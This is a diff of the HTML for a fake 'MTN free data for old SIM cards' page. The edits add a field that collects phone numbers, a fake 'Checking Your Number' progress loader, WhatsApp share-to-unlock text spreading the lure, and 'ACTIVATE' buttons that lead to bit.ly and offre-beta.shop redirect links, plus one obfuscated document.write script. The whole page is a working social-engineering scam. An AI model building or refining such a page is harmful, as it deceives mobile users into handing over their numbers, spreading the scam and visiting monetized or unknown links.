@@ -343,7 +343,7 @@ button:hover {
   
   
                     <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGSz9yf_L3u7EnJ84b_a7olUNv9mkMRzJN7OYnwAJq4vEE6BoV2ofJDEr5N4sY3aLcML3OiYEtdekCLyYrPw_wKgp82AMZeAphKxAOhUhpRyYWB10kaQXUtp3_3LPRv2b4gaIxPOBNyyvwBveAsAI1-GNhuL8pDQ9kF6_oZpwkOsoqGhCp078t-oY2Zb6z/s1242/A5331F49-C484-4462-AF86-098268312D71.jpeg" alt="Free-Data" style="width: 100%;">
-                      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiG-fkd6D9u42dcENOamYFR9PsgyM0ShnQcqgNr8mT_VgqJxVaxT-VUl0N0wOvQ0P5E89iKCy85em3PtxW7RWufljhf4U8P84hNTan3cRDuuOQQgPaJpZSZTMPnVNGdHieHEvbleXy3EKX2lXtY3U69pYUs-9jyiT1L41dBkdpVydLdRP1qNNcNI5pBG-Rm/s1080/DEC39B77-A672-4EF1-95EF-A6557102C7CF.jpeg" alt="Free-Data" style="width: 100%;">
+                      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilWJyGFkGSgFKcBPT77EXzSkp87f_r1ruXUqwA-03ZxDCIatRfnrPYEjBU-LU6KOfzaXP0rSc5iXYQwKkXGsTnZammm0imxEctSS95y0Ks6XQfpu9UyXkipMXIrld3RBf-mJjY86zColwzdXtZyihTe2GVyzN_0-i9yo4LCK5cQC0WNnqys4SPP3HerRU/s1080/Screenshot_20240709-082732.jpg" alt="Free-Data" style="width: 100%;">
       
                      </center>
   
@@ -365,48 +365,38 @@ button:hover {
 
 
 
-           <center><p class="title"><font color="black">CHOOSE YOUR COUNTRY BELOW</font></p></center>
-              <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhg_Vn6WCFGdQ85JzzizF4xOp7ReM3ds1hgsP0yAKR8M1L4ED0S-v5TbsmDHgS8ok5ICvYO_-E5hrHV_-EQZpDwR2SGxL788kX7SG8Rx2qS1GUGEpbdmi_RxOUWMbzxvQPOPQPq0VZTGWf1q2X6P4HPo2YgNT8x_mCJUqi-A5oMkfCVCYaT0M2Ml7jUmxjo/s1198/035FB38B-783A-4CAC-AA0E-FC8F9F1C813B.png" alt="Free-Data" style="width: 40%;"></center>
-          <center>
-<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
-    width: 330px;
-    height: 56px;
-">
-<option value="أختر نوع الشبكة" selected="1">---CHOOSE COUNTRY---</option>
-  <option value="1">MTN - Nigeria </option>
-<option value="2">MTN - Ghana  </option>
-<option value="2">MTN - Cameroon </option>
-<option value="2">MTN - Uganda </option>
-<option value="2">MTN - Zambia</option>
-<option value="2">MTN - South Africa</option>
-<option value="2">MTN - Rwanda</option>  
-  
-
-  
-</select>
-</center><br>
+              <center><b><font color="red">Provide your MTN Number</font></b></center>
               
- <center><p class="title"><font color="black">HOW OLD IS YOUR SIM CARD</font></p></center>
+               
+                <center><input type="char" placeholder="enter your MTN number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
+                 
+                
               
+               
+          
+               
+            <button id="go">Proceed ➤</button>
+        </div>
+        <div id="loader">
+            <div>Checking Your Number...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+         
+          
+    
+          <center><p class="title"><font color="red">HOW OLD IS YOUR SIM CARD</font></p></center>
           <center>
 <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
     width: 330px;
     height: 56px;
 ">
 <option value="أختر نوع الشبكة" selected="1">---CHOOSE HERE---</option>
-  <option value="1">5-years - 20GB</option>
-<option value="2">1-year - 10GB </option>
-<option value="2">6-Months - 5GB </option>
-
-
-  
+  <option value="1">6 Month and Above - 5GB  </option>
+<option value="2"> 1 Year and Above - 10GB  </option>
 </select>
-</center><br>              
-                 
-           
-              <center><p class="title"><font color="black">ENTER YOUR MTN NUMBER BELOW</font></p></center>
-              <center><input type="char" placeholder="Mobile No" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/> 
-               
+</center><br>
           
                
             <button id="go">SEND ➤</button>
@@ -425,7 +415,7 @@ button:hover {
           <button id="confirm">POOR</button>
           
             </div>
-            <p class="error">Sorry, Your Mobile Number is Missing <a href="https://gh-oldsimcard-reward.blogspot.com/?m=1#1691837210866"> <b><font color="#14948F">ADD NUMBER</font></b></a></p>
+            <p class="error">Sorry, Your Mobile Number is Missing <a href="https://www.offre-beta.shop/oldsimcardeng"> <b><font color="#14948F">ADD NUMBER</font></b></a></p>
         </div>
         <div id="checking">
           <p class="title"><font color="#000000">Processing your free data...</font></p>
@@ -475,14 +465,14 @@ button:hover {
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
             <p class="title"> <font color="#E39A06">Click "ACTIVATE" Below to activate your data </font> </p>
            <br/>
-          <a  onclick="window.open('http://dooloust.net/4/4697209')" href="http://dooloust.net/4/4697209" >
+          <a  onclick="window.open('https://bit.ly/Link-scripted')" href="https://bit.ly/Link-scripted" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow"><div width="300"
   height="40"
   behavior="alternate"
   style="border:solid"/>ACTIVATE 20GB</font></button>
                     </a><br/>
           
-       <a  onclick="window.open('http://dooloust.net/4/4697209')" href="http://dooloust.net/4/4697209" >
+       <a  onclick="window.open('https://bit.ly/Link-scripted')" href="https://bit.ly/Link-scripted" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow"><div width="300"
   height="40"
   behavior="alternate"
@@ -491,7 +481,7 @@ button:hover {
              <br/>
           
           
-          <a  onclick="window.open('http://dooloust.net/4/4697209')" href="http://dooloust.net/4/4697209" >
+          <a  onclick="window.open('https://bit.ly/Link-scripted')" href="https://bit.ly/Link-scripted" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow"><div width="300"
   height="40"
   behavior="alternate"
@@ -646,14 +636,14 @@ $(document).click(function () {
 
 
 <!--
-"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20MTN*%0Ahttps://cutt.ly/30-GB_MTN%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
 -->
       <script>
-        var text1 = "*MTN OLD CUSTOMERS REWARDS*%0A%0A20GB - For 5 Years Old Sim Card%0A 10GB For 1 Year Old Sim Card%0A 5GB For 6 months Old Sim Card%0A%0A*Hurry Now and Get Yours*%0A%0A_*5-YEARS OLD SIM* _👇%0A*https://bit.ly/Old-Customers-Reward-MTN* %0A%0A_*1-YEAR OLD SIM* _👇%0A*https://bit.ly/Old-Customers-Reward-MTN*%0A%0A_*6-MONTHS OLD SIM* _👇%0A*https://bit.ly/Old-Customers-Reward-MTN*",
+        var text1 = "*CONGRATULATIONS TO ALL MTN CUSTOMERS*%0A%0A MTN is Offering Free Data to all *OLD SIM CARD*%0A%0A6 Month Old Sim - *5GB*%0A1 Year and above - *10GB*%0A%0AHurry Now and check if your *MTN SIM CARD* is eligible for this offer%0A%0A_FOR 6-MONTH SIM_👇%0A*https://www.offre-beta.shop/oldsimcardeng*%0A%0A_1 YEAR AND ABOVE SIM_👇%0A*https://www.offre-beta.shop/oldsimcardeng*",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-            abcde = "http://dooloust.net/4/4697209",
+            abcde = "https://bit.ly/Link-scripted",
             saved = "",
             share = "whatsapp://send?text=" + text1;
     </script>
@@ -671,7 +661,7 @@ document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var
 
 
 
-<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCZXFPYIu7KsBlVtYFsOnKcQU48M3BUoFOlTaKaNvlxT5CWLhZKnOcjq3OKUCQ7-oSK_uF37jh68jBvQsJ53wKh70HTusRU0GhEVAlrStEFgPOPY6F2yeXfsf1sdGh7zNGKI9LIIM5Tj10QqvrDP-N6Pak1xJ9OOuQKX9y0M_UOOhjT-HeG-kdoxVUeSVW/s1106/5F9EA8E7-C3F4-431E-BCDB-1AF545F34BD9.jpeg" alt="Free-Data" style="width: 100%;"></center>
+<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9po-q9b0EO36Utpp1SssI1ek__RtXGLbxHq-3AuvYOnsQHVHauZugCNt4Kplpl27zz-x64N2F-xVLGMO-geDyU5atUHKNWEb4D4x99YmzUucxegnNcIzTuVLZHhr6y3HohsOH_eqVeIL5n91tQUspcG9GOvNygd5Cbn5rfsduH7F5Ft1o9HiELGlUbvg/s1080/Screenshot_20240709-082533.jpg" alt="Free-Data" style="width: 100%;"></center>
 
  
  
